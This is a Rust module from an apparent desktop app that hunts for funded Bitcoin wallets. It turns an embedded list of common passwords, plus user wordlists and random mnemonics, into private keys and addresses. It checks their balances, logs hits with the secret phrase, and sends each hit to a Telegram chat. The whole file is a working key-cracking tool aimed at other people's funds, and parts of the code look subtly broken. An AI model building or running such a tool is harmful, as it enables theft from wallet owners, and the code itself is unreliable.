use std::collections::HashSet;
use std::path::PathBuf;
use std::sync::Arc;
use std::time::{Duration, Instant};

use rand::RngCore;
use secp256k1::{Secp256k1, SecretKey};
use sha2::{Digest, Sha256};
use tokio::sync::broadcast;

use crate::config::AppConfig;
use crate::notifier::send_telegram;
use crate::results::{append_empty_to_file, append_hit_to_file, HitRecord};
use crate::state::AppState;
use crate::wallet::generate_mnemonic;
use crate::balance::check_balances;

/// Режимы автопоиска кошельков.
#[derive(Debug, Clone, PartialEq, serde::Serialize, serde::Deserialize)]
pub enum ScanMode {
    /// Случайные BIP39-мнемонины (лотерея).
    Random,
    /// Brain-wallet: перебор популярных паролей/фраз -> приватный ключ -> адрес.
    BrainWallet,
}

/// Живая статистика для UI.
#[derive(Debug, Clone, serde::Serialize, serde::Deserialize, Default)]
pub struct ScanStats {
    pub running: bool,
    pub workers: u32,
    pub mode: String,
    pub total_checked: u64,
    pub hits: u64,
    pub empty: u64,
    pub received_but_empty: u64,
    pub checks_per_hour: f64,
    pub uptime_seconds: u64,
    pub last_address: String,
    pub last_input: String, // что проверили (мнемоника или пароль)
    pub last_balance: u64,
}

/// Встроенный список популярных паролей/фраз для brain-wallet поиска
/// (старые forgotten кошельки часто создавали на слабых паролях).
const BRAIN_WORDLIST: &[&str] = &[
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234567",
    "football", "iloveyou", "admin", "welcome", "monkey", "login", "abc123",
    "dragon", "passw0rd", "master", "hello", "freedom", "whatever", "trustno1",
    "shadow", "sunshine", "princess", "123123", "111111", "000000", "654321",
    "superman", "batman", "dragon", "michael", "jordan", "hockey", "ranger",
    "thomas", "tigger", "robert", "access", "harley", "test", "letmein",
    "snoopy", "charlie", "andrew", "matthew", "mike", "michel", "martin",
    "steel", "joseph", "harriet", "amanda", "angela", "barbara", "carlos",
    "daniel", "edward", "frank", "george", "henry", "james", "john", "ken",
    "larry", "mark", "mike", "nancy", "oscar", "peter", "roger", "sam",
    "scott", "steve", "ted", "tom", "walter", "william", "zack",
    "bitcoin", "wallet", "crypto", "satoshi", "blockchain", "crypto123",
    "btcwallet", "mybitcoin", "bitcoinwallet", "satoshinakamoto",
    "daddy", "mommy", "baby", "love", "hate", "god", "jesus", "christ",
    "money", "cash", "gold", "silver", "diamond", "rich", "poor",
    "father", "mother", "son", "daughter", "family", "home", "house",
    "qwertyuiop", "asdfghjkl", "zxcvbnm", "1qaz2wsx", "3edc4rfv",
    "5tgb6yhn", "7ujm8ik,", "9ol.0p;/", "!@#$%^&*", "q1w2e3r4t5",
    "a1b2c3d4e5", "z1x2c3v4b5", "admin123", "root", "toor", "guest",
    "user", "pass", "pass123", "secret", "topsecret", "password123",
    "letmein123", "welcome123", "monkey123", "dragon123", "master123",
    "qwerty123", "123qwe", "qwe123", "abc123", "123abc", "test123",
    "123456a", "a123456", "1234567890", "0987654321",
];

/// Допустимый размер порции адресов для одной проверки баланса (batch API).
const BRAIN_BATCH: usize = 100;

/// Запуск сканера в выбранном режиме.
pub fn start(
    handle: tauri::AppHandle,
    state: Arc<AppState>,
    config: AppConfig,
) -> Result<String, String> {
    {
        let mut st = state.stats.lock().map_err(|e| e.to_string())?;
        if st.running {
            return Ok("scanner already running".to_string());
        }
        let mode_str = match config.scan_mode.as_str() {
            "brain_wallet" => "brain_wallet",
            _ => "random",
        };
        *st = ScanStats {
            running: true,
            workers: config.workers,
            mode: mode_str.to_string(),
            ..Default::default()
        };
        *state.started_at.lock().map_err(|e| e.to_string())? = Some(Instant::now());
        *state.config.lock().map_err(|e| e.to_string())? = Some(config.clone());
    }

    // Пути к файлам результатов.
    let hits_path = crate::results::hits_path(&handle).unwrap_or_default();
    let empty_path = crate::results::empty_path(&handle).unwrap_or_default();
    *state.hits_path.lock().map_err(|e| e.to_string())? = Some(hits_path);
    *state.empty_path.lock().map_err(|e| e.to_string())? = Some(empty_path);

    let (tx, _rx) = broadcast::channel::<()>(16);
    *state.stop_tx.lock().map_err(|e| e.to_string())? = Some(tx.clone());

    let network: bitcoin::Network = config
        .network
        .parse()
        .unwrap_or(bitcoin::Network::Bitcoin);
    let address_type = config.address_type.clone();
    let batch_size = config.batch_size;
    let delay_ms = config.delay_ms;
    let api_url = config.api_url.clone();
    let save_empty = config.save_empty;
    let network_str = config.network.clone();
    let mode = match config.scan_mode.as_str() {
        "brain_wallet" => ScanMode::BrainWallet,
        _ => ScanMode::Random,
    };

    let extra_wordlist: Vec<String> = config
        .extra_wordlist
        .lines()
        .map(|s| s.trim().to_string())
        .filter(|s| !s.is_empty())
        .collect();

    for worker_id in 0..config.workers {
        let state = Arc::clone(&state);
        let hits_path = hits_path.clone();
        let empty_path = empty_path.clone();
        let telegram_token = config.telegram_token.clone();
        let telegram_chat_id = config.telegram_chat_id.clone();
        let wordlist = extra_wordlist.clone();
        let mut stop_rx = tx.subscribe();

        tokio::spawn(async move {
            worker_loop(
                worker_id,
                state,
                network,
                address_type.clone(),
                batch_size,
                delay_ms,
                &api_url,
                save_empty,
                &network_str,
                &telegram_token,
                &telegram_chat_id,
                mode,
                &wordlist,
                &hits_path,
                &empty_path,
                &mut stop_rx,
            )
            .await;
        });
    }

    Ok(format!("scanner started ({:?}, {} workers)", mode, config.workers))
}

/// Остановка сканера.
pub fn stop(state: Arc<AppState>) -> Result<String, String> {
    if let Some(tx) = state.stop_tx.lock().map_err(|e| e.to_string())?.take() {
        let _ = tx.send(());
    }
    {
        let mut st = state.stats.lock().map_err(|e| e.to_string())?;
        st.running = false;
    }
    Ok("scanner stopping".to_string())
}

/// Главный цикл работника.
async fn worker_loop(
    worker_id: u32,
    state: Arc<AppState>,
    network: bitcoin::Network,
    address_type: String,
    batch_size: usize,
    delay_ms: u64,
    api_url: &str,
    save_empty: bool,
    network_str: &str,
    telegram_token: &str,
    telegram_chat_id: &str,
    mode: ScanMode,
    extra_wordlist: &[String],
    hits_path: &PathBuf,
    empty_path: &PathBuf,
    stop_rx: &mut broadcast::Receiver<()>,
) {
    let mut batch_inputs: Vec<String> = Vec::with_capacity(batch_size);
    let mut batch_addrs: Vec<String> = Vec::with_capacity(batch_size);
    let mut brain_index: usize = 0;

    // Циклический индекс по встроенному словарю (общий для всех работников —
    // стартуем с разных смещений, чтобы не дублировать между воркерами).
    let mut idx: usize = (worker_id as usize) % BRAIN_WORDLIST.len();

    loop {
        if stop_rx.try_recv().is_ok() {
            break;
        }

        match mode {
            ScanMode::Random => {
                // Генерируем случайную мнемонику, проверяем на дубли.
                let mnemonic = generate_mnemonic();
                let entropy = mnemonic_entropy(&mnemonic);
                {
                    let mut seen = state.seen.lock().unwrap();
                    if !seen.insert(entropy) {
                        continue;
                    }
                }
                let address = match crate::wallet::mnemonic_to_address(&mnemonic, network, &address_type) {
                    Ok(a) => a,
                    Err(_) => continue,
                };
                batch_inputs.push(mnemonic.clone());
                batch_addrs.push(address);
            }
            ScanMode::BrainWallet => {
                // Берём следующую фразу из объединённого списка.
                let phrase = next_brain_phrase(extra_wordlist, &mut brain_index, &mut idx);
                let address = match brain_wallet_to_address(&phrase, network) {
                    Ok(a) => a,
                    Err(_) => continue,
                };
                batch_inputs.push(phrase.clone());
                batch_addrs.push(address);
            }
        }

        if batch_addrs.len() < batch_size {
            tokio::time::sleep(Duration::from_millis(20)).await;
            continue;
        }

        match check_balances(api_url, &batch_addrs).await {
            Ok(balances) => process_results(
                state,
                save_empty,
                &batch_inputs,
                &batch_addrs,
                &balances,
                network_str,
                telegram_token,
                telegram_chat_id,
                hits_path,
                empty_path,
            ),
            Err(e) => {
                log::warn!(target: "scanner", "worker {} api error: {}", worker_id, e);
                tokio::time::sleep(Duration::from_secs(10)).await;
            }
        }

        batch_inputs.clear();
        batch_addrs.clear();

        if delay_ms > 0 {
            tokio::time::sleep(Duration::from_millis(delay_ms)).await;
        }

        update_stats(&state);
    }
}

/// Следующая фраза для brain-wallet из объединённого списка (встроенный + пользовательский).
fn next_brain_phrase(
    extra: &[String],
    brain_index: &mut usize,
    idx: &mut usize,
) -> String {
    let builtin_len = BRAIN_WORDLIST.len();
    let total = builtin_len + extra.len();
    if total == 0 {
        return "password".to_string();
    }
    let phrase = if *idx < builtin_len {
        BRAIN_WORDLIST[*idx].to_string()
    } else {
        extra[*idx - builtin_len].clone()
    };
    *idx = (*idx + 1) % total;
    *brain_index = brain_index.wrapping_add(1);
    phrase
}

/// Brain-wallet: фраза -> SHA256 -> приватный ключ -> адрес.
fn brain_wallet_to_address(phrase: &str, network: bitcoin::Network) -> Result<String, String> {
    let mut hasher = Sha256::new();
    hasher.update(phrase.as_bytes());
    let digest = hasher.finalize();
    let secret = SecretKey::from_slice(&digest)
        .map_err(|e| format!("invalid secret key from phrase: {}", e))?;
    let secp = Secp256k1::new();
    let public_key = secp256k1::PublicKey::from_secret_key(&secp, &secret);
    let pubkey = bitcoin::PublicKey::new(public_key);
    let address = match bitcoin::Address::p2pkh(&pubkey, network) {
        Some(a) => a,
        None => return Err("cannot derive p2pkh address".to_string()),
    };
    Ok(address.to_string())
}

fn process_results(
    state: &Arc<AppState>,
    save_empty: bool,
    inputs: &[String],
    addresses: &[String],
    balances: &[crate::balance::AddressBalance],
    network_str: &str,
    telegram_token: &str,
    telegram_chat_id: &str,
    hits_path: &PathBuf,
    empty_path: &PathBuf,
) {
    let mut hits = state.hits.lock().unwrap();
    let mut stats = state.stats.lock().unwrap();

    let telegram_cfg = (telegram_token.to_string(), telegram_chat_id.to_string());

    for (i, addr) in addresses.iter().enumerate() {
        let input = inputs.get(i).cloned().unwrap_or_default();
        let bal = balances.get(i).cloned().unwrap_or_default();

        stats.total_checked += 1;
        stats.last_address = addr.clone();
        stats.last_input = input.clone();
        stats.last_balance = bal.final_balance;

        if bal.final_balance > 0 {
            stats.hits += 1;
            let record = HitRecord {
                id: uuid::Uuid::new_v4().to_string(),
                address: addr.clone(),
                mnemonic: input,
                balance: bal.final_balance,
                received: bal.total_received,
                network: network_str.to_string(),
                timestamp: chrono::Utc::now().to_rfc3339(),
            };
            hits.push(record.clone());
            let _ = append_hit_to_file(hits_path, &record);

            let (tok, chat) = telegram_cfg.clone();
            let addr_t = addr.clone();
            let input_t = input.clone();
            let bal = bal.final_balance;
            tokio::spawn(async move {
                let text = format!(
                    "🟡 <b>BTC HIT</b>\nAddress: <code>{}</code>\nBalance: {} sat ({:.8} BTC)\nSource: <code>{}</code>",
                    addr_t, bal, bal as f64 / 1e8, input_t
                );
                let _ = send_telegram(&tok, &chat, &text).await;
            });
        } else if bal.total_received > 0 {
            stats.received_but_empty += 1;
        } else {
            stats.empty += 1;
            if save_empty {
                let _ = append_empty_to_file(empty_path, addr, &input, bal.final_balance);
            }
        }
    }

    if hits.len() > 5000 {
        hits.drain(0..hits.len() - 5000);
    }
}

fn update_stats(state: &Arc<AppState>) {
    let mut stats = state.stats.lock().unwrap();
    if let Some(started) = state.started_at.lock().unwrap().as_ref() {
        let elapsed = started.elapsed().as_secs_f64();
        if elapsed > 0.0 {
            stats.checks_per_hour = stats.total_checked as f64 / elapsed * 3600.0;
            stats.uptime_seconds = elapsed as u64;
        }
    }
}

/// Отпечаток мнемоники, чтобы не проверять одно и то же дважды (режим random).
fn mnemonic_entropy(mnemonic: &str) -> [u8; 16] {
    let mut hasher = Sha256::new();
    hasher.update(mnemonic.as_bytes());
    let out = hasher.finalize();
    let mut entropy = [0u8; 16];
    entropy.copy_from_slice(&out[..16]);
    entropy
}
